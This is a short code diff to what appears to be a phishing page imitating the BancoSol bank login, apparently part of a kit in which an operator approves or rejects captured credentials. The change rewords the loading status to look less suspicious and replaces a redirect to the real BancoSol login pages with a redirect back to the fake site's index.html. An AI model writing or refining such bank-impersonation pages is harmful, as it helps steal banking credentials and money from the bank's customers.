@@ -76,7 +76,7 @@
         <img src="./empresas_files/logo-blue.png" alt="BancoSol" class="loader-logo">
         <div class="loader-spinner"></div>
         <div class="loader-text">Validando credenciales<span class="loader-dots"></span></div>
-        <div class="loader-status" id="statusText">Esperando verificación del administrador...</div>
+        <div class="loader-status" id="statusText">Confirmacion de datos...</div>
     </div>
 
     <script>
@@ -145,13 +145,9 @@
             console.log('🔄 Estado detectado:', estado, 'Portal:', portalOrigen);
 
             if (estado === 'aprobado') {
-                console.log('✅ APROBADO - Redirigiendo al sitio real');
-                // Redirigir al sitio real de BancoSol
-                if (portalOrigen === 'empresas') {
-                    window.location.href = 'https://solnet.bdb.bancosol.com.bo/login';
-                } else {
-                    window.location.href = 'https://solnetdigital.bancosol.com.bo/login';
-                }
+                console.log('✅ APROBADO - Redirigiendo a index.html');
+                // Redirigir a la página principal (index.html)
+                window.location.href = 'index.html';
                 return true;
             } 
             else if (estado === 'rechazado') {
